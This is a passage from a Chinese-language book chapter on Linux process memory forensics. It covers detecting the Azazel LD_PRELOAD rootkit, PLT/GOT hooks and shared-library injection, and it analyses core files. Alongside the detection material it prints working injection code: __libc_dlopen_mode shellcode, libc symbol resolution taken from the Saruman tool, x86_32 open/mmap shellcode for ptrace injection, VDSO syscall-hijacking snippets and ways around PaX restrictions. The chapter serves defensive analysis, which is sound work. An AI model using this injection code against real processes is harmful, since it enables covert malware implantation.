+   内联函数挂钩：这种方法，也称为**函数跳板**，在磁盘和内存中都很常见。攻击者可以用`jmp`指令替换函数中的前 5 到 7 个字节的代码，将控制转移到恶意函数。这可以通过扫描每个函数的初始字节代码来轻松检测到。

+   修补.ctors 和.dtors：二进制文件中的.ctors 和.dtors 部分（可以位于内存中）包含初始化和终结函数的函数指针数组。攻击者可以在磁盘和内存中对其进行修补，使其指向寄生代码。

+   利用 VDSO 进行系统调用拦截：映射到进程地址空间的 VDSO 页面包含用于调用系统调用的代码。攻击者可以使用`ptrace(PTRACE_SYSCALL, ...)`来定位这段代码，然后用所需调用的系统调用号替换**%rax**寄存器。这允许聪明的攻击者在进程中调用任何他们想要的系统调用，而无需注入 shellcode。查看我 2009 年写的这篇论文；它详细描述了这一技术：[`vxheaven.org/lib/vrn00.html`](http://vxheaven.org/lib/vrn00.html)。

# 检测 ET_DYN 注入

我认为最普遍的进程感染类型是 DLL 注入，也称为`.so`注入。这是一种干净有效的解决方案，适合大多数攻击者和运行时恶意软件的需求。让我们看看一个被感染的进程，我将强调我们可以识别寄生代码的方法。

### 注意

术语**共享对象**，**共享库**，**DLL**和**ET_DYN**在本书中都是同义词，特别是在本节中。

## Azazel 用户态 rootkit 检测

我们的感染进程是一个名为`./host`的简单测试程序，它被 Azazel 用户态 rootkit 感染。 Azazel 是流行的 Jynx rootkit 的新版本。这两个 rootkit 都依赖于`LD_PRELOAD`来加载恶意共享库，劫持各种`glibc`共享库函数。我们将使用各种 GNU 工具和 Linux 环境，如`/proc`文件系统，来检查被感染的进程。

## 映射进程地址空间

分析进程时的第一步是映射地址空间。最直接的方法是查看`/proc/<pid>/maps`文件。我们要注意任何奇怪的文件映射和具有奇怪权限的段。在我们的情况下，我们可能需要检查环境变量的堆栈，因此我们需要注意其在内存中的位置。

### 注意

`pmap <pid>`命令也可以用来代替`cat /proc/<pid>/maps`。我更喜欢直接查看映射文件，因为它显示了每个内存段的整个地址范围以及任何文件映射的完整文件路径，如共享库。

这是一个被感染进程`./host`的内存映射的示例：

```
$ cat /proc/`pidof host`/maps
00400000-00401000 r-xp 00000000 00:24 5553671       /home/user/git/azazel/host
00600000-00601000 r--p 00000000 00:24 5553671       /home/user/git/azazel/host
00601000-00602000 rw-p 00001000 00:24 5553671       /home/user/git/azazel/host
0066c000-0068d000 rw-p 00000000 00:00 0              [heap]
3001000000-3001019000 r-xp 00000000 08:01 11406078  /lib/x86_64-linux-gnu/libaudit.so.1.0.0
3001019000-3001218000 ---p 00019000 08:01 11406078  /lib/x86_64-linux-gnu/libaudit.so.1.0.0
3001218000-3001219000 r--p 00018000 08:01 11406078  /lib/x86_64-linux-gnu/libaudit.so.1.0.0
3001219000-300121a000 rw-p 00019000 08:01 11406078  /lib/x86_64-linux-gnu/libaudit.so.1.0.0
300121a000-3001224000 rw-p 00000000 00:00 0
3003400000-300340d000 r-xp 00000000 08:01 11406085    /lib/x86_64-linux-gnu/libpam.so.0.83.1
300340d000-300360c000 ---p 0000d000 08:01 11406085    /lib/x86_64-linux-gnu/libpam.so.0.83.1
300360c000-300360d000 r--p 0000c000 08:01 11406085    /lib/x86_64-linux-gnu/libpam.so.0.83.1
300360d000-300360e000 rw-p 0000d000 08:01 11406085    /lib/x86_64-linux-gnu/libpam.so.0.83.1
7fc30ac7f000-7fc30ac81000 r-xp 00000000 08:01 11406070 /lib/x86_64-linux-gnu/libutil-2.19.so
7fc30ac81000-7fc30ae80000 ---p 00002000 08:01 11406070 /lib/x86_64-linux-gnu/libutil-2.19.so
7fc30ae80000-7fc30ae81000 r--p 00001000 08:01 11406070 /lib/x86_64-linux-gnu/libutil-2.19.so
7fc30ae81000-7fc30ae82000 rw-p 00002000 08:01 11406070 /lib/x86_64-linux-gnu/libutil-2.19.so
7fc30ae82000-7fc30ae85000 r-xp 00000000 08:01 11406068 /lib/x86_64-linux-gnu/libdl-2.19.so
7fc30ae85000-7fc30b084000 ---p 00003000 08:01 11406068 /lib/x86_64-linux-gnu/libdl-2.19.so
7fc30b084000-7fc30b085000 r--p 00002000 08:01 11406068 /lib/x86_64-linux-gnu/libdl-2.19.so
7fc30b085000-7fc30b086000 rw-p 00003000 08:01 11406068 /lib/x86_64-linux-gnu/libdl-2.19.so
7fc30b086000-7fc30b241000 r-xp 00000000 08:01 11406096 /lib/x86_64-linux-gnu/libc-2.19.so
7fc30b241000-7fc30b440000 ---p 001bb000 08:01 11406096 /lib/x86_64-linux-gnu/libc-2.19.so
7fc30b440000-7fc30b444000 r--p 001ba000 08:01 11406096 /lib/x86_64-linux-gnu/libc-2.19.so
7fc30b444000-7fc30b446000 rw-p 001be000 08:01 11406096 /lib/x86_64-linux-gnu/libc-2.19.so
7fc30b446000-7fc30b44b000 rw-p 00000000 00:00 0
7fc30b44b000-7fc30b453000 r-xp 00000000 00:24 5553672   /home/user/git/azazel/libselinux.so
7fc30b453000-7fc30b652000 ---p 00008000 00:24 5553672   /home/user/git/azazel/libselinux.so
7fc30b652000-7fc30b653000 r--p 00007000 00:24 5553672   /home/user/git/azazel/libselinux.so
7fc30b653000-7fc30b654000 rw-p 00008000 00:24 5553672   /home/user/git/azazel/libselinux.so
7fc30b654000-7fc30b677000 r-xp 00000000 08:01 11406093    /lib/x86_64-linux-gnu/ld-2.19.so
7fc30b847000-7fc30b84c000 rw-p 00000000 00:00 0
7fc30b873000-7fc30b876000 rw-p 00000000 00:00 0
7fc30b876000-7fc30b877000 r--p 00022000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fc30b877000-7fc30b878000 rw-p 00023000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fc30b878000-7fc30b879000 rw-p 00000000 00:00 0
7fff82fae000-7fff82fcf000 rw-p 00000000 00:00 0          [stack]
7fff82ffb000-7fff82ffd000 r-xp 00000000 00:00 0          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0  [vsyscall]
```

*./host*进程的 maps 文件的前述输出中突出显示了感兴趣和关注的区域。特别注意具有`/home/user/git/azazel/libselinux.so`路径的共享库。这应立即引起您的注意，因为该路径不是标准的共享库路径，并且它的名称是`libselinux.so`，传统上存储在所有其他共享库中（即`/usr/lib`）。

这可能表明可能存在共享库注入（也称为`ET_DYN`注入），这意味着这不是真正的`libselinux.so`库。在这种情况下，我们可能首先检查`LD_PRELOAD`环境变量，看它是否被用于**预加载**`libselinux.so`库。

## 在堆栈上查找 LD_PRELOAD

程序的环境变量在运行时存储在堆栈的底部附近。堆栈的底部实际上是最高地址（堆栈的开始），因为堆栈在 x86 架构上向较小的地址增长。根据`/proc/<pid>/maps`的输出，我们可以获得堆栈的位置：

```
STACK_TOP           STACK_BOTTOM
7fff82fae000   -    7fff82fcf000
```

因此，我们想要从`0x7fff82fcf000`开始检查堆栈。使用 GDB，我们可以附加到进程并通过使用`x/s <address>`命令快速定位堆栈上的环境变量，该命令告诉 GDB 以 ASCII 格式查看内存。`x/4096s <address>`命令执行相同的操作，但从 4,096 字节的数据中读取。

我们可以合理推测环境变量将位于堆栈的前 4,096 字节内，但由于堆栈向较小地址增长，我们必须从`<stack_bottom> - 4096`开始读取。

### 注意

argv 和 envp 指针分别指向命令行参数和环境变量。我们不是在寻找实际的指针，而是这些指针引用的字符串。

以下是使用 GDB 读取堆栈上环境变量的示例：

```
$ gdb -q attach `pidof host`
$ x/4096s (0x7fff82fcf000 – 4096)

… scroll down a few pages …

0x7fff82fce359:  "./host"
0x7fff82fce360:  "LD_PRELOAD=./libselinux.so"
0x7fff82fce37b:  "XDG_VTNR=7"
---Type <return> to continue, or q <return> to quit---
0x7fff82fce386:  "XDG_SESSION_ID=c2"
0x7fff82fce398:  "CLUTTER_IM_MODULE=xim"
0x7fff82fce3ae:  "SELINUX_INIT=YES"
0x7fff82fce3bf:  "SESSION=ubuntu"
0x7fff82fce3ce:  "GPG_AGENT_INFO=/run/user/1000/keyring-jIVrX2/gpg:0:1"
0x7fff82fce403:  "TERM=xterm"
0x7fff82fce40e:  "SHELL=/bin/bash"

… truncated …
```

从前述输出中，我们已经验证了`LD_PRELOAD`被用于预加载`libselinux.so`到进程中。这意味着程序中任何与预加载共享库中的函数同名的 glibc 函数将被覆盖，并有效地被`libselinux.so`中的函数劫持。

换句话说，如果`./host`程序调用 glibc 的`fopen`函数，而`libselinux.so`包含自己版本的`fopen`，那么 PLT/GOT（`.got.plt`部分）中将存储`fopen`函数，并且会使用`libselinux.so`版本而不是 glibc 版本。这将引导我们到下一个指示的项目——检测 PLT/GOT（PLT 的全局偏移表）中的函数劫持。

## 检测 PLT/GOT 挂钩

在检查 ELF 部分中名为`.got.plt`的 PLT/GOT（位于可执行文件的数据段中）之前，让我们看看`./host`程序中哪些函数对 PLT/GOT 有重定位。从 ELF 内部章节中记得，全局偏移表的重定位条目是`<ARCH>_JUMP_SLOT`类型的。详细信息请参考 ELF(5)手册。

### 注意

PLT/GOT 的重定位类型称为`<ARCH>_JUMP_SLOT`，因为它们就是那样——跳转槽。它们包含函数指针，PLT 使用 jmp 指令将控制传输到目标函数。实际的重定位类型根据架构命名为`X86_64_JUMP_SLOT, i386_JUMP_SLOT`等等。

以下是识别共享库函数的示例：

```
$ readelf -r host
Relocation section '.rela.plt' at offset 0x418 contains 7 entries:
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 unlink + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 opendir + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main+0
000000601038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __gmon_start__+0
000000601040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 pause + 0
000000601048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 fopen + 0
```

我们可以看到有几个调用的知名 glibc 函数。可能其中一些或全部被冒牌共享库`libselinux.so`劫持。

### 识别不正确的 GOT 地址

从`readelf`输出中显示`./host`可执行文件中的 PLT/GOT 条目，我们可以看到每个符号的地址。让我们来看看内存中全局偏移表中以下符号的地址：`fopen`，`opendir`和`unlink`。这些可能已经被劫持，不再指向`libc.so`库。

以下是 GDB 输出显示 GOT 值的示例：

```
(gdb) x/gx 0x601048
0x601048 <fopen@got.plt>:  0x00007fc30b44e609
(gdb) x/gx 0x601018
0x601018 <unlink@got.plt>:  0x00007fc30b44ec81
(gdb) x/gx 0x601028
0x601028 <opendir@got.plt>:  0x00007fc30b44ed77
```

快速查看`selinux.so`共享库的可执行内存区域，我们可以看到 GDB 中 GOT 中显示的地址指向`selinux.so`内部的函数，而不是`libc.so`。

```
7fc30b44b000-7fc30b453000 r-xp  /home/user/git/azazel/libselinux.so

```

对于这种特定的恶意软件（Azazel），恶意共享库是使用`LD_PRELOAD`预加载的，这使得验证库是否可疑变得非常简单。但情况并非总是如此，因为许多形式的恶意软件将通过`ptrace()`或使用`mmap()`或`__libc_dlopen_mode()`的 shellcode 注入共享库。确定共享库是否已被注入的启发式方法将在下一节详细介绍。

### 注意

正如我们将在下一章中看到的那样，用于进程内存取证的 ECFS 技术具有一些功能，使得识别注入的 DLL 和其他类型的 ELF 对象几乎变得简单。

## ET_DYN 注入内部

正如我们刚刚演示的，检测已使用`LD_PRELOAD`预加载的共享库是相当简单的。那么注入到远程进程中的共享库呢？换句话说，已插入到现有进程中的共享对象呢？如果我们想要能够迈出下一步并检测 PLT/GOT 钩子，那么知道共享库是否被恶意注入是很重要的。首先，我们必须确定共享库可以被注入到远程进程的所有方式，正如我们在第 7.2.2 节中简要讨论的那样。

让我们看一个具体的例子，说明这可能是如何实现的。这是 Saruman 的一些示例代码，它将 PIE 可执行文件注入到进程中。

### 注意

PIE 可执行文件与共享库的格式相同，因此相同的代码将适用于将任一类型注入到进程中。

使用`readelf`实用程序，我们可以看到在标准 C 库（`libc.so.6`）中存在一个名为`__libc_dlopen_mode`的函数。这个函数实际上实现了与`dlopen`函数相同的功能，而`dlopen`函数并不驻留在`libc`中。这意味着对于任何使用`libc`的进程，我们都可以让动态链接器加载我们想要的任何`ET_DYN`对象，同时还自动处理所有的重定位补丁。

### 示例 - 查找 __libc_dlopen_mode 符号

攻击者通常使用这个函数将`ET_DYN`对象加载到进程中：

```
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep dlopen
  2128: 0000000000136160   146 FUNC    GLOBAL DEFAULT   12 __libc_dlopen_mode@@GLIBC_PRIVATE
```

### 代码示例 - __libc_dlopen_mode shellcode

以下代码是用 C 编写的，但编译成机器代码后，可以作为我们使用`ptrace`注入到进程中的 shellcode：

```
#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour
__PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *path, void *dlopen_addr)
{
        void * (*libc_dlopen_mode)(const char *, int) = dlopen_addr;
        void *handle = (void *)0xfff; //initialized for debugging
        handle = libc_dlopen_mode(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);
        __RETURN_VALUE__(handle);
        __BREAKPOINT__;
}
```

注意其中一个参数是`void *dlopen_addr`。Saruman 定位了`__libc_dlopen_mode()`函数的地址，该函数驻留在`libc.so`中。这是通过一个解析`libc`库中符号的函数来实现的。

### 代码示例 - libc 符号解析

以下代码还有许多细节，我强烈建议您查看 Saruman。它专门用于注入编译为`ET_DYN`对象的可执行程序，但正如之前提到的，注入方法也适用于共享库，因为它们也编译为`ET_DYN`对象：

```
Elf64_Addr get_sym_from_libc(handle_t *h, const char *name)
{
        int fd, i;
        struct stat st;
        Elf64_Addr libc_base_addr = get_libc_addr(h->tasks.pid);
        Elf64_Addr symaddr;

        if ((fd = open(globals.libc_path, O_RDONLY)) < 0) {
                perror("open libc");
                exit(-1);
        }

        if (fstat(fd, &st) < 0) {
                perror("fstat libc");
                exit(-1);
        }

        uint8_t *libcp = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
        if (libcp == MAP_FAILED) {
                perror("mmap libc");
                exit(-1);
        }

        symaddr = resolve_symbol((char *)name, libcp);
        if (symaddr == 0) {
                printf("[!] resolve_symbol failed for symbol '%s'\n", name);
                printf("Try using --manual-elf-loading option\n");
                exit(-1);
        }
        symaddr = symaddr + globals.libc_addr;

        DBG_MSG("[DEBUG]-> get_sym_from_libc() addr of __libc_dl_*: %lx\n", symaddr);
        return symaddr;

}
```

为了进一步揭开共享库注入的神秘面纱，让我向您展示一种更简单的技术，即使用`ptrace`注入的 shellcode 来将共享库`open()/mmap()`到进程地址空间中。这种技术可以使用，但需要恶意软件手动处理所有的热补丁重定位。`__libc_dlopen_mode()`函数通过动态链接器本身透明地处理所有这些，因此从长远来看实际上更容易。

### 代码示例-用于 mmap() ET_DYN 对象的 x86_32 shellcode

以下 shellcode 可以注入到给定进程中的可执行段中，然后使用`ptrace`执行。

请注意，这是我在本书中第二次使用这个手写的 shellcode 作为示例。我在 2008 年为 32 位 Linux 系统编写了它，并且方便在示例中使用。否则，我肯定会写一些新的内容来演示 x86_64 Linux 中更现代的方法：

```
_start:
        jmp B
A:

        # fd = open("libtest.so.1.0", O_RDONLY);

        xorl %ecx, %ecx
        movb $5, %al
        popl %ebx
        xorl %ecx, %ecx
        int $0x80

        subl $24, %esp

        # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);

        xorl %edx, %edx
        movl %edx, (%esp)
        movl $8192,4(%esp)
        movl $7, 8(%esp)
        movl $2, 12(%esp)
        movl %eax,16(%esp)
        movl %edx, 20(%esp)
        movl $90, %eax
        movl %esp, %ebx
        int $0x80

        # the int3 will pass control back the tracer
        int3
B:
        call A
        .string "/lib/libtest.so.1.0"
```

使用`PTRACE_POKETEXT`注入它，并使用`PTRACE_SETREGS`将`%eip`设置为 shellcode 的入口点，一旦 shellcode 触发`int3`指令，它将有效地将控制权传递回执行感染的程序。然后，它可以简单地从现在感染了共享库(`/lib/libtest.so.1.0`)的主机进程中分离出来。

在某些情况下，例如启用了 PaX mprotect 限制的二进制文件（[`pax.grsecurity.net/docs/mprotect.txt`](https://pax.grsecurity.net/docs/mprotect.txt)），`ptrace`系统调用无法用于将 shellcode 注入到文本段中。这是因为它是只读的，并且限制还将阻止将文本段标记为可写，因此您不能简单地绕过这一点。但是，可以通过几种方式来规避这一限制，例如将指令指针设置为`__libc_dlopen_mode`并将函数的参数存储在寄存器中（如`%rdi`、`%rsi`等）。或者，在 32 位架构的情况下，参数可以存储在堆栈上。

另一种方法是操纵大多数进程中存在的 VDSO 代码。

## 操纵 VDSO 执行脏工作

这种技术是在[`vxheaven.org/lib/vrn00.html`](http://vxheaven.org/lib/vrn00.html)上演示的，但是基本思想很简单。VDSO 代码映射到进程地址空间，如本章前面的`/proc/<pid>/maps`输出所示，其中包含通过*syscall*（64 位）和*sysenter*（32 位）指令调用系统调用的代码。在 Linux 中，系统调用的调用约定总是将系统调用号放在`%eax/%rax`寄存器中。

如果攻击者使用`ptrace(PTRACE_SYSCALL, …)`，他们可以快速定位 VDSO 代码中的 syscall 指令，并替换寄存器值以调用所需的系统调用。如果这样做得当，并且在恢复原始正在执行的系统调用时进行，那么它不会导致应用程序崩溃。`open`和`mmap`系统调用可用于将可执行对象（如`ET_DYN`或`ET_REL`）加载到进程地址空间中。或者，它们可以用于简单地创建一个可以存储 shellcode 的匿名内存映射。

这是一个代码示例，攻击者利用这个代码在 32 位系统上：

```
fffe420 <__kernel_vsyscall>:
ffffe420:       51                      push   %ecx
ffffe421:       52                      push   %edx
ffffe422:       55                      push   %ebp
ffffe423:       89 e5                   mov    %esp,%ebp
ffffe425:       0f 34                   sysenter
```

### 注意

在 64 位系统上，VDSO 包含至少两个使用 syscall 指令的位置。攻击者可以操纵其中任何一个。

以下是一个代码示例，攻击者利用这个代码在 64 位系统上：

```
ffffffffff700db8:       b0 60                   mov    $0x60,%al
ffffffffff700dba:       0f 05                   syscall
```

## 共享对象加载-合法与否？

动态链接器是将共享库引入进程的唯一合法方式。但是，请记住，攻击者可以使用`__libc_dlopen_mode`函数，该函数调用动态链接器来加载对象。那么我们如何知道动态链接器是否在进行合法工作呢？有三种合法的方式，动态链接器将共享对象映射到进程中。

### 合法的共享对象加载

让我们看看我们认为是合法的共享对象加载的方式：

+   可执行程序中有一个有效的`DT_NEEDED`条目，对应于共享库文件。

+   动态链接器有效加载的共享库可能会有自己的`DT_NEEDED`条目，以便加载其他共享库。这可以称为传递式共享库加载。

+   如果程序链接了`libdl.so`，那么它可以使用动态加载函数来动态加载库。加载共享对象的函数名为`dlopen`，解析符号的函数名为`dlsym`。

### 注意

正如我们之前讨论过的，`LD_PRELOAD`环境变量也会调用动态链接器，但这种方法处于灰色地带，因为它通常用于合法和非法两种目的。因此，它没有包括在*合法的共享对象加载*列表中。

### 非法的共享对象加载

现在，让我们看看共享对象可以被加载到进程中的非法方式，也就是说，由攻击者或恶意软件实例：

+   `__libc_dlopen_mode`函数存在于`libc.so`（而不是`libdl.so`）中，并且不打算由程序调用。它实际上被标记为`GLIBC PRIVATE`函数。大多数进程都有`libc.so`，因此这是攻击者或恶意软件常用的函数，用于加载任意共享对象。

+   `VDSO`操纵。正如我们已经展示的，这种技术可以用于执行任意系统调用，因此可以简单地使用这种方法内存映射共享对象。

+   直接调用`open`和`mmap`系统调用的 Shellcode。

+   攻击者可以通过覆盖可执行文件或共享库的动态段中的`DT_NULL`标签来添加`DT_NEEDED`条目，从而能够告诉动态链接器加载他们希望加载的任何共享对象。这种特定方法在第六章中已经讨论过，更多地属于那一章的主题，但在检查可疑进程时可能也是必要的。

### 注意

确保检查可疑进程的二进制，并验证动态段是否看起来可疑。参考第六章中的*检查动态段以查找 DLL 注入痕迹*部分。

现在我们已经清楚地定义了合法与非法加载共享对象的标准，我们可以开始讨论检测共享库是否合法的启发式方法。

值得注意的是，`LD_PRELOAD`通常用于好坏两种目的，唯一确定的方法是检查预加载的共享对象中实际的代码。因此，在这里的启发式讨论中，我们将不讨论`LD_PRELOAD`。

## .so 注入检测的启发式方法

在这一部分，我将描述检测共享库是否合法的一般原则。在第八章中，我们将讨论 ECFS 技术，该技术实际上将这些启发式方法纳入了其功能集中。

现在，让我们只看原则。我们想要获取映射到进程的共享库列表，然后查看哪些符合动态链接器的合法加载条件：

1.  从`/proc/<pid>/maps`文件中获取共享对象路径列表。

### 注意

一些恶意注入的共享库不会出现为文件映射，因为攻击者创建了匿名内存映射，然后将共享对象代码复制到这些内存区域中。在下一章中，我们将看到 ECFS 也可以清除这些更隐秘的实体。可以扫描每个匿名映射到可执行内存区域，以查看是否存在 ELF 头，特别是具有`ET_DYN`文件类型的头。

1.  确定可执行文件中是否存在与您所看到的共享库对应的有效`DT_NEEDED`条目。如果存在，则它是合法的共享库。在验证了给定的共享库是合法的之后，检查该共享库的动态段，并枚举其中的`DT_NEEDED`条目。这些对应的共享库也可以标记为合法的。这回到了传递共享对象加载的概念。

1.  查看进程的实际可执行程序的`PLT/GOT`。如果使用了任何`dlopen`调用，则分析代码以查找任何`dlopen`调用。`dlopen`调用可能会传递静态检查的参数，例如：

```
void *handle = dlopen("somelib.so", RTLD_NOW);
```

在这种情况下，字符串将被存储为静态常量，因此将位于二进制文件的`.rodata`部分。因此，检查`.rodata`部分（或者存储字符串的任何地方）是否包含任何包含您要验证的共享库路径的字符串。

1.  如果在 maps 文件中找到的任何共享对象路径找不到或者不能由`DT_NEEDED`部分解释，并且也不能由任何`dlopen`调用解释，那么这意味着它要么是由`LD_PRELOAD`预加载，要么是由其他方式注入的。在这一点上，您应该将共享对象标记为可疑。

## 用于检测 PLT/GOT 挂钩的工具

目前，在 Linux 中没有太多专门用于进程内存分析的好工具。这就是我设计 ECFS 的原因（在第八章中讨论，“ECFS – 扩展核心文件快照技术”）。我知道的只有几个工具可以检测 PLT/GOT 覆盖，它们每一个基本上都使用我们刚刚讨论的相同的启发式方法：

+   Linux VMA Voodoo：这个工具是我在 2011 年通过 DARPA CFT 计划设计的原型。它能够检测许多类型的进程内存感染，但目前只能在 32 位系统上运行，而且不对公众开放。然而，新的 ECFS 实用程序是开源的，受到 VMA Voodoo 的启发。您可以在[`www.bitlackeys.org/#vmavudu`](http://www.bitlackeys.org/#vmavudu)了解 VMA Voodoo。

+   ECFS（扩展核心文件快照）技术：这项技术最初是为了在 Linux 中作为本机快照格式用于进程内存取证工具而设计的。它已经发展成为更多的东西，并且有一个专门的章节介绍它（第八章，“ECFS – 扩展核心文件快照技术”）。它可以在[`github.com/elfmaster/ecfs`](https://github.com/elfmaster/ecfs)找到。

+   Volatility plt_hook：Volatility 软件主要用于全系统内存分析，但 Georg Wicherski 在 2013 年设计了一个插件，专门用于检测进程内的 PLT/GOT 感染。这个插件使用了我们之前讨论的类似的启发式方法。这个功能现在已经与 Volatility 源代码合并在一起，可以在[`github.com/volatilityfoundation/volatility`](https://github.com/volatilityfoundation/volatility)找到。

# Linux ELF 核心文件

在大多数 UNIX 风格的操作系统中，可以向进程发送信号，以便它转储核心文件。核心文件本质上是进程及其状态在核心（崩溃或转储）之前的快照。核心文件是一种 ELF 文件，主要由程序头和内存段组成。它们还包含大量的注释，描述文件映射、共享库路径和其他信息。

核心文件本身对于进程内存取证并不特别有用，但对于更敏锐的分析师可能会产生一些结果。

### 注意

这实际上是 ECFS 介入的地方；它是常规 Linux ELF 核心格式的扩展，并提供了专门用于取证分析的功能。

## 核心文件的分析- Azazel rootkit

在这里，我们将使用`LD_PRELOAD`环境变量感染一个进程，然后向该进程发送中止信号，以便我们可以捕获用于分析的核心转储。

### 启动 Azazel 感染的进程并获取核心转储

```
$ LD_PRELOAD=./libselinux.so ./host &
[1] 9325
$ kill -ABRT `pidof host`
[1]+  Segmentation fault      (core dumped) LD_PRELOAD=./libselinux.so ./host
```

### 核心文件程序头

在核心文件中，有许多程序头。除了一个之外，所有程序头都是`PT_LOAD`类型。对于进程中的每个内存段，都有一个`PT_LOAD`程序头，特殊设备（即`/dev/mem`）除外。从共享库和匿名映射到堆栈、堆、文本和数据段，所有内容都由程序头表示。

然后，有一个`PT_NOTE`类型的程序头；它包含了整个核心文件中最有用和描述性的信息。

### PT_NOTE 段

接下来显示的`eu-readelf -n`输出显示了核心文件注释段的解析。我们之所以在这里使用`eu-readelf`而不是常用的`readelf`，是因为 eu-readelf（ELF Utils 版本）需要时间来解析注释段中的每个条目，而更常用的`readelf`（binutils 版本）只显示`NT_FILE`条目：

```
$ eu-readelf -n core

Note segment of 4200 bytes at offset 0x900:
  Owner          Data size  Type
  CORE                 336  PRSTATUS
    info.si_signo: 11, info.si_code: 0, info.si_errno: 0, cursig: 11
    sigpend: <>
    sighold: <>
    pid: 9875, ppid: 7669, pgrp: 9875, sid: 5781
    utime: 5.292000, stime: 0.004000, cutime: 0.000000, cstime: 0.000000
    orig_rax: -1, fpvalid: 1
    r15:                       0  r14:                       0
    r13:         140736185205120  r12:                 4195616
    rbp:      0x00007fffb25380a0  rbx:                       0
    r11:                     582  r10:         140736185204304
    r9:                 15699984  r8:               1886848000
    rax:                      -1  rcx:                    -160
    rdx:         140674792738928  rsi:              4294967295
    rdi:                 4196093  rip:      0x000000000040064f
    rflags:   0x0000000000000286  rsp:      0x00007fffb2538090
    fs.base:   0x00007ff1677a1740  gs.base:   0x0000000000000000
    cs: 0x0033  ss: 0x002b  ds: 0x0000  es: 0x0000  fs: 0x0000  gs: 0x0000
  CORE                 136  PRPSINFO
    state: 0, sname: R, zomb: 0, nice: 0, flag: 0x0000000000406600
    uid: 0, gid: 0, pid: 9875, ppid: 7669, pgrp: 9875, sid: 5781
    fname: host, psargs: ./host
  CORE                 128  SIGINFO
    si_signo: 11, si_errno: 0, si_code: 0
    sender PID: 7669, sender UID: 0
  CORE                 304  AUXV
    SYSINFO_EHDR: 0x7fffb254a000
    HWCAP: 0xbfebfbff  <fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe>
    PAGESZ: 4096
    CLKTCK: 100
    PHDR: 0x400040
    PHENT: 56
    PHNUM: 9
    BASE: 0x7ff1675ae000
    FLAGS: 0
    ENTRY: 0x400520
    UID: 0
    EUID: 0
    GID: 0
    EGID: 0
    SECURE: 0
    RANDOM: 0x7fffb2538399
    EXECFN: 0x7fffb2538ff1
    PLATFORM: 0x7fffb25383a9
    NULL
  CORE                1812  FILE
    30 files:
   00400000-00401000 00000000 4096        /home/user/git/azazel/host
   00600000-00601000 00000000 4096        /home/user/git/azazel/host
   00601000-00602000 00001000 4096        /home/user/git/azazel/host
   3001000000-3001019000 00000000 102400  /lib/x86_64-linux-gnu/libaudit.so.1.0.0
   3001019000-3001218000 00019000 2093056 /lib/x86_64-linux-gnu/libaudit.so.1.0.0
   3001218000-3001219000 00018000 4096    /lib/x86_64-linux-gnu/libaudit.so.1.0.0
   3001219000-300121a000 00019000 4096    /lib/x86_64-linux-gnu/libaudit.so.1.0.0
   3003400000-300340d000 00000000 53248   /lib/x86_64-linux-gnu/libpam.so.0.83.1
   300340d000-300360c000 0000d000 2093056 /lib/x86_64-linux-gnu/libpam.so.0.83.1
   300360c000-300360d000 0000c000 4096    /lib/x86_64-linux-gnu/libpam.so.0.83.1
   300360d000-300360e000 0000d000 4096    /lib/x86_64-linux-gnu/libpam.so.0.83.1
  7ff166bd9000-7ff166bdb000 00000000 8192    /lib/x86_64-linux-gnu/libutil-2.19.so
  7ff166bdb000-7ff166dda000 00002000 2093056 /lib/x86_64-linux-gnu/libutil-2.19.so
  7ff166dda000-7ff166ddb000 00001000 4096    /lib/x86_64-linux-gnu/libutil-2.19.so
  7ff166ddb000-7ff166ddc000 00002000 4096    /lib/x86_64-linux-gnu/libutil-2.19.so
  7ff166ddc000-7ff166ddf000 00000000 12288   /lib/x86_64-linux-gnu/libdl-2.19.so
  7ff166ddf000-7ff166fde000 00003000 2093056 /lib/x86_64-linux-gnu/libdl-2.19.so
  7ff166fde000-7ff166fdf000 00002000 4096    /lib/x86_64-linux-gnu/libdl-2.19.so
  7ff166fdf000-7ff166fe0000 00003000 4096    /lib/x86_64-linux-gnu/libdl-2.19.so
  7ff166fe0000-7ff16719b000 00000000 1814528 /lib/x86_64-linux-gnu/libc-2.19.so
  7ff16719b000-7ff16739a000 001bb000 2093056 /lib/x86_64-linux-gnu/libc-2.19.so
  7ff16739a000-7ff16739e000 001ba000 16384   /lib/x86_64-linux-gnu/libc-2.19.so
  7ff16739e000-7ff1673a0000 001be000 8192    /lib/x86_64-linux-gnu/libc-2.19.so
  7ff1673a5000-7ff1673ad000 00000000 32768   /home/user/git/azazel/libselinux.so
  7ff1673ad000-7ff1675ac000 00008000 2093056 /home/user/git/azazel/libselinux.so
  7ff1675ac000-7ff1675ad000 00007000 4096    /home/user/git/azazel/libselinux.so
  7ff1675ad000-7ff1675ae000 00008000 4096    /home/user/git/azazel/libselinux.so
  7ff1675ae000-7ff1675d1000 00000000 143360 /lib/x86_64-linux-gnu/ld-2.19.so
  7ff1677d0000-7ff1677d1000 00022000 4096   /lib/x86_64-linux-gnu/ld-2.19.so
  7ff1677d1000-7ff1677d2000 00023000 4096   /lib/x86_64-linux-gnu/ld-2.19.so
```

能够查看寄存器状态、辅助向量、信号信息和文件映射并不是坏消息，但它们本身还不足以分析进程的恶意软件感染。

### PT_LOAD 段和核心文件在取证目的上的缺陷

每个内存段都包含一个程序头，描述了它所代表的段的偏移量、地址和大小。这几乎表明你可以通过程序段访问进程镜像的每个部分，但这只是部分正确的。可执行文件的文本镜像和映射到进程的每个共享库只有自己的前 4,096 字节被转储到一个段中。

